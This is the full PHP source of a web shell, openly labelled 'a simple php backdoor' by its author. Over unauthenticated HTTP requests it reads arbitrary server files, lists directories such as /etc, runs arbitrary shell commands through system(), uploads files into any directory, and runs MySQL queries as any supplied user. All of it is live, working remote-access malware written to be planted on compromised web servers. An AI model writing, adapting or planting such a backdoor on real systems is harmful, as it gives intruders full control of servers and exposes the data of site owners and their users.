<?
// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\

ob_implicit_flush();
if(isset($_REQUEST['f'])){
        $filename=$_REQUEST['f'];
        $file=fopen("$filename","rb");
        fpassthru($file);
        die;
}
if(isset($_REQUEST['d'])){
        $d=$_REQUEST['d'];
        echo "<pre>";
        if ($handle = opendir("$d")) {
        echo "<h2>listing of $d</h2>";
                   while ($dir = readdir($handle)){ 
                       if (is_dir("$d/$dir")) echo "<a href='$PHP_SELF?d=$d/$dir'><font color=grey>";
							else echo "<a href='$PHP_SELF?f=$d/$dir'><font color=black>";
                       echo "$dir\n"; 
                       echo "</font></a>";
                }
                       
        } else echo "opendir() failed";
        closedir($handle);
        die ("<hr>"); 
}
if(isset($_REQUEST['c'])){
	echo "<pre>";
	system($_REQUEST['c']);		   
	die;
}
if(isset($_REQUEST['upload'])){

		if(!isset($_REQUEST['dir'])) die('hey,specify directory!');
			else $dir=$_REQUEST['dir'];
		$fname=$HTTP_POST_FILES['file_name']['name'];
		if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))
			die('file uploading error.');
}
if(isset($_REQUEST['mquery'])){
	
	$host=$_REQUEST['host'];
	$usr=$_REQUEST['usr'];
	$passwd=$_REQUEST['passwd'];
	$db=$_REQUEST['db'];
	$mquery=$_REQUEST['mquery'];
	mysql_connect("$host", "$usr", "$passwd") or
    die("Could not connect: " . mysql_error());
    mysql_select_db("$db");
    $result = mysql_query("$mquery");
	if($result!=FALSE) echo "<pre><h2>query was executed correctly</h2>\n";
    while ($row = mysql_fetch_array($result,MYSQL_ASSOC)) print_r($row);  
    mysql_free_result($result);
	die;
}
?>
<pre><form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value="go"><hr></form> 
<form enctype="multipart/form-data" action="<?php echo $PHP_SELF; ?>" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000">
upload file:<input name="file_name" type="file">   to dir: <input type="text" name="dir">&nbsp;&nbsp;<input type="submit" name="upload" value="upload"></form>
<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory here]
<br>for example:
http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
<hr>execute mysql query:
<form action="<? echo $PHP_SELF; ?>" METHOD=GET >
host:<input type="text" name="host"value="localhost">  user: <input type="text" name="usr" value=root> password: <input type="text" name="passwd">

database: <input type="text" name="db">  query: <input type="text" name="mquery"> <input type="submit" value="execute">
</form>

<!--	http://michaeldaw.org	2006 	-->
